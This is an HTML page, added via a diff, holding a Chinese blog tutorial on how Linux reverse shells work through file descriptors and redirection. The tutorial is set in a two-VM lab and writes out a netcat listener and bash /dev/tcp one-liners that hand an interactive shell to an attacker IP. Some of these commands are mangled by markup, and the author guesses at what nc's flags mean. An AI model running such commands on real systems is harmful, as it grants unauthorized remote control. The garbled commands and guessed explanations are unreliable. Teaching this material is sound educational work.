@@ -1,0 +1,456 @@
+<!doctype html>
+<html lang="en-us">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <title>linux下反弹shell的原理浅析 | 开发者问答集锦</title>
+    <meta property="og:title" content="linux下反弹shell的原理浅析 - 开发者问答集锦">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+    <meta name="Keywords" content="">
+    <meta name="description" content="linux下反弹shell的原理浅析">
+        
+    <meta name="author" content="">
+    <meta property="og:url" content="https://zaina.newban.cn/posts/linux%E4%B8%8B%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://zaina.newban.cn">
+                        开发者问答集锦
+                    </a>
+                
+                
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="" href="https://zaina.newban.cn">首页</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    
+    <article class="post">
+        <header>
+            <h1 class="post-title">linux下反弹shell的原理浅析</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2020年9月2日
+        </date>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="post-content">
+            
+
+<h2 id="反弹shell文件描述符与重定向">反弹shell文件描述符与重定向</h2>
+
+<p>在这里最难理解的就是文件描述符和重定向这两部分</p>
+
+<p>先来讲一下linux的文件描述符，什么是文件描述符，</p>
+
+<p>在linux系统中将所有设备都当做文件来处理，而linux文件描述符用来标识每个文件对象，在我理解中就是描述符用来指定对象的，这样才能井然有序的运行。在linux系统中就连输入设备和输出设备都被当成是文件来处理就拿显示器和键盘输入都拿来当成文件处理，他们都有相应的文件描述符与之相对应。</p>
+
+<p>Linux启动时会默认打开三个文件描述符：</p>
+
+<p><a href="https://img.it610.com/image/info8/0e59294afbe04a729412423795f7931b.jpg"><img src="https://img.it610.com/image/info8/0e59294afbe04a729412423795f7931b.jpg" alt="linux下反弹shell的原理浅析_第1张图片" /></a>
+标准输入standard input 0 （默认设备键盘）<br />
+标准输出standard output 1（默认设备显示器）<br />
+错误输出：error output 2（默认设备显示器）</p>
+
+<p>这些描述符是默认开启的，之后再打开文件的话描述符会依次增加。一条shell命令，都会继承其父进程的文件描述符，所以所有的shell命令都会有这三个默认的描述符。</p>
+
+<p>我来解释一下0,1,2分别的指向，这样会更好理解一点:</p>
+
+<p>0可以理解为我们在与计算机进行交互时的输入，而这个输入默认是指向键盘的</p>
+
+<p>1可以理解为我和计算机交互时的输出，而这个输出默认指向显示器的，也就是我们的屏幕显示。</p>
+
+<p>2可以理解为我和计算机交互时，计算机出现错误的输入，指向的位置和1的是同一位置，都是显示器</p>
+
+<p>文件的所有输入输出都是有该进程的所有打开的文件描述符来控制的（怎么理解呢，默认的都是有上面介绍的一样，0就是键盘输入，1就是输出在显示器上，如果我将我的输入不显示在显示器上而显示在某个文件中，也是利用描述符来规定的，只需要将描述符1重定向到你要输出的文件中）</p>
+
+<p>接下来就来理解如何操作。</p>
+
+<h2 id="linux中重定向的理解">Linux中重定向的理解</h2>
+
+<p>重定向字面意思就是重新规定一个方向，这里的意思与Linux中大致相同，也差不多是这个意思。</p>
+
+<p>Linux中重定向分为两种：</p>
+
+<p>输入重定向 &lt;</p>
+
+<p>输出重定向 &gt;</p>
+
+<p><strong>重点：</strong></p>
+
+<p>Bash在执行一条命令的时候，首先会检查命令中是否含有重定向，如果有就先将文件描述符重定向，然后把重定向去掉，执行命令</p>
+
+<p>如果命令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序，会发生很大的改变。</p>
+
+<p>&lt; 是对标准输入重定向</p>
+
+<blockquote>
+<p>是对标准输出重定向</p>
+</blockquote>
+
+<p>那么重定向怎么用呢？</p>
+
+<ol>
+<li><strong>输入重定向</strong></li>
+</ol>
+
+<p>格式：[n]&lt; word (注意n与</p>
+
+<p>解释： 将描述符重定向到word指代的文件（以只读的方式打开），如果省略n的话默认为0（标准输入）</p>
+
+<p>上几张图来理解理解：</p>
+
+<p><a href="https://img.it610.com/image/info8/69074ffd0407462f823ce24fb97265d4.jpg"><img src="https://img.it610.com/image/info8/69074ffd0407462f823ce24fb97265d4.jpg" alt="linux下反弹shell的原理浅析_第2张图片" /></a></p>
+
+<p>比如说我要将标准输入重定向到file文件中：0&lt; file</p>
+
+<p>那么我输入的东西以只读的形式将file表示出来没错可以试试，前提是你的file文件中有东西哦，这里确实不太好理解，再来讲一下怎么去理解吧，首先0是不是表示标准输入，而这个输入就看成是键盘，默认是不是这样理解的没错吧，而现在只不过是将标准输入进行了重定向而已。只需要将重定向后的file看成是键盘就可以了，这样就好理解了，这个file里的东西就是我们键盘要输入的东西，自然会将file的东西显示出来：0&lt;
+file cat</p>
+
+<p>重定向后在执行cat命令，就更好理解了。</p>
+
+<p>其实这里有点像c语言中的指针（有没有？就是将0这个指针指向了不同的地址，自然就有了不同的输入）</p>
+
+<ol>
+<li><strong>输出重定向</strong></li>
+</ol>
+
+<p>格式 ： [n]&gt; word</p>
+
+<p>这里与输入重定向一样好理解的，看上面的那张截图我也用到了输出重定向将hello
+word输出到file中（只是输出的位置从显示器重定向为了file这个文件而已）这样解释应该能理解吧！</p>
+
+<p><strong>3.标准输出与标准错误输出重定向</strong></p>
+
+<p>格式：&amp;&gt; word &gt;&amp; word</p>
+
+<p>解释:这两种格式意义是完全相同的，用其中一个就可以了，含义就是将标准输出和标准错误输出都重定向到word代表的文件（以写的方式打开），这种格式其实就是等价于这样的：</p>
+
+<ol>
+<li>word 2&gt;&amp;1</li>
+</ol>
+
+<p>讲解一下，这里的2&gt;&amp;1就是将标准错误输入复制到标准输出当中去这里的&amp;是用来区分文件1和文件描述符1的。</p>
+
+<p>再说明一下可能有的还不清楚什么是错误输出呢?
+比如说我想要查询ip地址，将命令写成了ipconfig,那么他就会报错这些报错不会输出到标准的输出当中去，只有进行从定向将他和标准输出一同重定向到一个文件即可。</p>
+
+<p><strong>4.文件描述符的复制</strong></p>
+
+<p>格式：[n]&amp;[m] （注意这之间都没有空格）</p>
+
+<p>解释：这两个格式都是将文件描述符n复制到m,这两者的区别在于前者是利用读的形式打开后者是以写的形式打开</p>
+
+<p>一次0&amp;1是等价的（这里的&amp;上面讲到了就是用来区分描述符和文件名的）</p>
+
+<p>这里推荐一篇讲的很详细的博客：<a href="https://xz.aliyun.com/t/2548?accounttraceid=136b41a1-fb0f-4c96-81ba-7a5a352d9f27">https://xz.aliyun.com/t/2548?accounttraceid=136b41a1-fb0f-4c96-81ba-7a5a352d9f27</a></p>
+
+<p>OK，文件描述符理解完了就可以很好地来理解反弹shell的原理了；接下来就讲解反弹shell的原理，利用上面的知识来加深对反弹shell的理解吧.</p>
+
+<h2 id="什么是反弹shell">什么是反弹shell？</h2>
+
+<p>反弹shell就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端，本质上啊就是客户端与服务端的反转。</p>
+
+<p>通俗的讲呢：打个比方吧，比如说我是攻击方，你是受害方，这是我在监听某端口，而你又向我发的端口进行了相应的请求，造成了我可以控制你的shell命令，也就是说从某种程度来讲控制了你的电脑，就是将你的shell命令反弹到我这里啊，就是输出输入都在我这里，这就是反弹shell</p>
+
+<h2 id="反弹shell的本质是什么">反弹shell的本质是什么</h2>
+
+<p>我们来创建一个环境来试验一下看看到底是怎样的来实现的</p>
+
+<p>实验环境：</p>
+
+<p>这里我用了两个虚拟机一个是ubuntu ：192.168.233.134 作为攻击机</p>
+
+<p>另一个就是kali :192.168.233.131 作为被攻击机</p>
+
+<p>我们以最常见的bash为例：</p>
+
+<p>Attackers机器上执行： nc -lvp 2333</p>
+
+<p>可能有一些会不太理解，说明一下：bash 呢就是linux中默认的标准shell，就是相当于解析，里面包含了大多数的基本命令，</p>
+
+<p>而执行的这句语句的意思就是监听2333端口，详细分析一下语句，在我理解中语句的全称是这样的（只是我这么理解的，不知道对不对）：netcat -list
+view port 2333</p>
+
+<p>意思就是建议一个网络连接监听2333端口</p>
+
+<p>在victim（受害机）中执行：</p>
+
+<p>bash -I &gt; &amp; /dev/tcp/192.168.233.<sup>134</sup>&frasl;<sub>2333</sub> 0&gt;&amp;1</p>
+
+<p>你会看到：<a href="https://img.it610.com/image/info8/71c23668425c4348b3237bc955ffe8a4.jpg"><img src="https://img.it610.com/image/info8/71c23668425c4348b3237bc955ffe8a4.jpg" alt="linux下反弹shell的原理浅析_第3张图片" /></a></p>
+
+<p>在ubuntu中已经有kali的反弹shell了。</p>
+
+<p>解释下语句：-i 这个参数表示的是产生交互式的shell，</p>
+
+<p>/dev/tcp/ip/port 这个文件比较特殊实际上可以看成是一个设备（linux下一切皆文件）</p>
+
+<p>我们看到了上面的语句中有我们 之前讲到的重定向和文件描述符，接下来就来详细地讲解一下：</p>
+
+<p>先从简单的演示起，一步一步来深入：</p>
+
+<p>首先我们为了实现交互我们把受害者交互式的shell的输出重定向到攻击机上在受害者机器上进行输入命令：</p>
+
+<p>在victim中输入：bash -i &gt; /dev/tcp/192.168.233.<sup>134</sup>&frasl;<sub>2333</sub></p>
+
+<p>这句命令如果懂了之前的讲的重定向应该好理解吧，就是将输出重定向到了攻击机上，就是显示不会再kali中显示了而重定向到了ubuntu中：可以自己实现以下。</p>
+
+<p>我们也可以将输入重定向到攻击机上，从攻击机上进行输入，受害机回显：</p>
+
+<p>bash -i &lt; /dev/tcp/192.168.233.<sup>134</sup>&frasl;<sub>2333</sub></p>
+
+<p><a href="https://img.it610.com/image/info8/b3cdf06c526c411580c46fb32df46232.png"><img src="https://img.it610.com/image/info8/b3cdf06c526c411580c46fb32df46232.png" alt="linux下反弹shell的原理浅析_第4张图片" /></a></p>
+
+<p><a href="https://img.it610.com/image/info8/35e58e6f82044616a32428303d3fce24.jpg"><img src="https://img.it610.com/image/info8/35e58e6f82044616a32428303d3fce24.jpg" alt="linux下反弹shell的原理浅析_第5张图片" /></a></p>
+
+<p>就是这样的我在攻击机上输入而受害机会回显。</p>
+
+<p>我们想要的结果肯定是即在攻击机上输入也在攻击机上回显，应该怎么做呢？其实还是文件描述符重定向的操作：</p>
+
+<p>bash -i &gt; /dev/tcp/192.168.233.<sup>134</sup>&frasl;<sub>2333</sub> 0&gt;&amp;1</p>
+
+<p>这一句也好理解吧，输出重定向到攻击机上，输入也重定向到攻击机上，这样我们就基本上完成了一个反弹shell的功能</p>
+
+<p><a href="https://img.it610.com/image/info8/61930363c24c4e658fe4a24e3a0aecaf.jpg"><img src="https://img.it610.com/image/info8/61930363c24c4e658fe4a24e3a0aecaf.jpg" alt="linux下反弹shell的原理浅析_第6张图片" /></a></p>
+
+<p>似乎我们并没有得到全部的回显信息，想想我们的错误输入的重定向还是默认的在受害机中，如果改一下应该就可以了试试：</p>
+
+<p>bash -i &gt; /dev/tcp/192.168.233.<sup>134</sup>&frasl;<sub>2333</sub> 0&gt;&amp;1 2&gt;&amp;1</p>
+
+<p><a href="https://img.it610.com/image/info8/a1f8090952644272aa8d59bea7e620d7.jpg"><img src="https://img.it610.com/image/info8/a1f8090952644272aa8d59bea7e620d7.jpg" alt="linux下反弹shell的原理浅析_第7张图片" /></a></p>
+
+<p>Ok 这才是是我们最终想要的结果，上面的那句语句有点长，可以再简化一下，还记不记得之前讲的：&gt;&amp;就是标准输出 和错误输出一起重定向所以语句可以这样写：</p>
+
+<p>bash -i &gt;&amp; /dev/tcp/192.168.233.<sup>134</sup>&frasl;<sub>2333</sub> 0&gt;&amp;1</p>
+
+<p>这和上面那句是等价的。</p>
+
+<p>反弹shell的方法有很多，这就是基本的原理。</p>
+
+<p>详细介绍请参考：<a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>
+
+        </div>
+
+        
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a></li>
+        
+        <li><a href="/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/">009Shell脚本下条件测试eqne</a></li>
+        
+        <li><a href="/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/">00Pythonmanagepyshell和Python的分析</a></li>
+        
+        <li><a href="/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a></li>
+        
+        <li><a href="/posts/018dockerfileshell/">018DockerfileSHELL</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='https://zaina.newban.cn/tags/shell'>shell</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/categories">分类</a></h3>
+<ul class="widget-list">
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/tags">标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
+    
+    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
+    
+</div>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
